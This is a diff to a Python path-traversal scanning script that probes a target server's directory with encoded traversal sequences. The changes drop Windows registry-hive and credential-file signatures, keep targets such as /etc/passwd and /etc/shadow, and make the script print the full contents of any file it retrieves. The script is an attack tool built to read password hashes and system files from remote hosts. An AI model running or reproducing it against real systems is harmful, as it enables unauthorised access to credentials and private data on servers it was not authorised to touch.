@@ -65,28 +65,6 @@ def get_common_files(os_type):
 
 def get_file_signatures():
     return {
-        # Windows
-        "C:/Windows/win.ini": ["[fonts]", "[mci]"],
-        "C:/boot.ini": ["[boot loader]", "default="],
-        "C:/Windows/System32/drivers/etc/hosts": ["127.0.0.1", "::1"],
-        "C:/Windows/System32/config/SAM": ["SAMFileVersion", "HKEY_LOCAL_MACHINE\\SAM"],
-        "C:/Windows/System32/config/SYSTEM": ["ControlSet001", "HKEY_LOCAL_MACHINE\\SYSTEM"],
-        "C:/Windows/System32/config/SECURITY": ["Security", "HKEY_LOCAL_MACHINE\\SECURITY"],
-        "C:/Windows/System32/config/software": ["Software", "HKEY_LOCAL_MACHINE\\SOFTWARE"],
-        "C:/Windows/System32/config/default": ["default", "HKEY_LOCAL_MACHINE\\DEFAULT"],
-        "C:/Users/Administrator/NTUSER.DAT": [],
-        "C:/Windows/System32/cmd.exe": ["Microsoft Windows", "cmd.exe"],
-        "C:/Windows/System32/hosts": ["127.0.0.1", "::1"],
-        "C:/Windows/System32/inetpub/wwwroot/": [],
-        "C:/xampp/htdocs/": [],
-        "C:/wamp64/www/": [],
-        "C:/Windows/System32/winevt/Logs/": [],
-        "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/": [],
-        "C:/Users/<username>/AppData/Roaming/Microsoft/Windows/Recent/": [],
-        "C:/Users/<username>/Documents/": [],
-        "C:/Users/<username>/AppData/Local/": [],
-        
-        # Linux
         "/etc/passwd": ["root:x:0:0:", "daemon:x:1:"],
         "/etc/shadow": [":$6$", ":$1$"],
         "/etc/hostname": [],
@@ -128,14 +106,12 @@ def is_valid_response(file_path, response, known_files, signatures, content):
         return False
 
 def make_request(url):
-    # Parse the URL
     parsed_url = urlparse(url)
     conn = http.client.HTTPConnection(parsed_url.hostname, parsed_url.port)
-    
-    # Send the request with path-as-is
     conn.request("GET", parsed_url.path + "?" + parsed_url.query)
     response = conn.getresponse()
-    content = response.read().strip().decode("utf-8")  # Read content once
+    raw = response.read()
+    content = raw.decode("utf-8", errors="replace")  # Ensures full content is decoded
     return response, content
 
 def main():
@@ -144,9 +120,9 @@ def main():
     parser.add_argument("-p", "--port", required=True, help="Target port")
     parser.add_argument("-d", "--directory", required=True, help="Vulnerable directory path")
     parser.add_argument("--level", type=int, choices=[0, 1], default=0, help="Traversal encoding level (0=basic, 1=extended)")
-    parser.add_argument("-O", "--os", choices=["windows", "linux"], help="Target OS type (optional). Use to scan common sensitive files")
-    parser.add_argument("--continue-on-success", action="store_true", help="Continue scanning even after a successful match")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output for each request")
+    parser.add_argument("-O", "--os", choices=["windows", "linux"], help="Target OS type (optional)")
+    parser.add_argument("--continue-on-success", action="store_true", help="Continue scanning after a match")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
 
     if len(sys.argv) == 1 or any(arg not in sys.argv for arg in ["-i", "-p", "-d"]):
         print("Usage: python3 path.py -i <IP> -p <PORT> -d <DIRECTORY> [--level 0|1] [-O linux|windows] [--continue-on-success] [-v]")
@@ -198,11 +174,11 @@ def main():
                 print(f"\n[{counter}] Technique: {technique}")
                 print(f"[+] URL: {full_url}")
                 print(f"Status: {response.status} {response.reason}")
-                print("Content preview:")
-                print(content[:500] + ("..." if len(content) > 500 else ""))
+                print("Content:\n")
+                print(content)
 
                 if not args.continue_on_success:
-                    return  # Stop after first success
+                    return
 
             except Exception as e:
                 print(f"[{counter}] [!] Request failed: {e}")
